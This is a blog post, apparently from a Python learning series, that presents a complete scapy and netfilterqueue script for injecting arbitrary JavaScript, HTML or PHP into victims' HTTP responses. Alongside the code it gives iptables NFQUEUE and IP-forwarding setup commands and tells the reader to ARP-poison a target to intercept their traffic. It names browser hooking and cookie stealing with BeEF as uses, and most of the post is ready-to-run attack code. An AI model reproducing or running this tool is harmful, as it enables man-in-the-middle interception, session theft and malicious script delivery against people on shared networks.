---
title: A Code Injector program
date: 2021-07-29 09:45:47 +07:00
categories: python_101
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: A program to injects arbitary code  into the response of a HTTP request.
---


<p align="center">
 <img src="https://pbs.twimg.com/media/EXiXVKVXsAA5uO7?format=jpg&name=small">
</p>


## This is a python script that injects arbitary code (JS,HTML,PHP...) into the response of a HTTP request.

* The program works only on HTTP sites.
* We use IPTABLES to build a queue to intercept traffic. Based on INPUT(inboud traffic),OUTPUT(outbound traffic) and FORWARD(traffic from remote hosts).
The program automatically runs these commands, if it dosen't work for some reason, run the following commands to build a queue alongside when running the program -
    > `iptables -I INPUT -j NFQUEUE --queue-num 0` --> Intercept Queue for inbound traffic.
   
    > `iptables -I OUTPUT -j NFQUEUE --queue-num 0` --> Intercept Queue for outbound traffic.
    
    > `iptables --flush` --> flush rules after completion.
* We filter the traffic like an intercepting proxy would to filter and modify HTTP responses for the target site to inject our malicious script just before the __\<body\>__ tag of the HTML response source. Many avenues of attacks can be performed like browser hooking, cookie stealing etc by using external frameworks like BEEF.
* While altering the response one thing to note is that the injected code gets cut off due to the "Content-Length" limitations. Hence we alter the Content-Length too by adding the length of the injected code to the original Content-Length.


### Code:

```python
#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import argparse
import re


# Parse Args
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file-to-inject", dest="file", help="File/Code to Inject", type=str)
    options = parser.parse_args()
    if not options.file:
        # code to handle error
        parser.error("\n[-] Please specify a valid file with code to inject(js,HTML,php...),  use --help for info.")
    File = open(options.file, 'r')
    f = File.readlines()
    code = ""
    for line in f:
        code += line.strip()
    return(code)

# Alter packets load
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.TCP].chksum
    del packet[scapy.IP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #print(scapy_packet.show())
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                print("\n[+] Request from: " + scapy_packet[scapy.IP].src)
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response from: " + scapy_packet[scapy.IP].src)
                injection_code = code
                # Appends injected code before terminating </body> tag
                load = load.replace("</body>", injection_code + "</body>")
                # Capture non capturing groups and use non capturing regex --> (?:...)
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
            # Exec if load is modified
            if load != scapy_packet[scapy.Raw].load:
                print("[!] Response Injected!")
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        # Irrelevant HTML data
        except UnicodeDecodeError:
            pass
    packet.accept()

print("""
                              (                                       
   (          (           )\ )                        )           
   )\         )\ )   (   (()/(       (     (       ( /(      (    
 (((_)   (   (()/(  ))\   /(_)) (    )\   ))\  (   )\()) (   )(   
 )\___   )\   ((_))/((_) (_))   )\ )((_) /((_) )\ (_))/  )\ (()\  
((/ __| ((_)  _| |(_))   |_ _| _(_/(  ! (_))  ((_)| |_  ((_) ((_) 
 | (__ / _ \/ _` |/ -_)   | | | ' \))| |/ -_)/ _| |  _|/ _ \| '_| 
  \___|\___/\__,_|\___|  |___||_||_|_/ |\___|\__|  \__|\___/|_|   
                                   |__/                           
""")

print("[-] Specify a file to inject code from to poison any HTTP websites source.\n\n")
print("[NOTE:] To sniff a target remote system, ARP Poison the target's cache to allow all DNS requests to flow through this machine\n\n")
print("""
[!] Run the following commands as root before using this program to setup IPTABLE rules.

1. iptables -I OUTPUT -j NFQUEUE --queue-num 0
2. iptables -I INPUT -j NFQUEUE --queue-num 0
3. echo 1 > /proc/sys/net/ipv4/ip_forward

""")

try:
    code = get_arguments()
    queue = netfilterqueue.NetfilterQueue()
    # Bind to created queue using iptables; process_packet-->callback()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ......\n\n\n Exiting Program!")
```

### Output:

_Attacker:_

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/CodeInjector/code_inject3.png)

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/CodeInjector/code_inject4.png)


_Victim:_

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/CodeInjector/code_inject1.png)

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/CodeInjector/code_inject2.png)

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/CodeInjector/code_inject5.png)

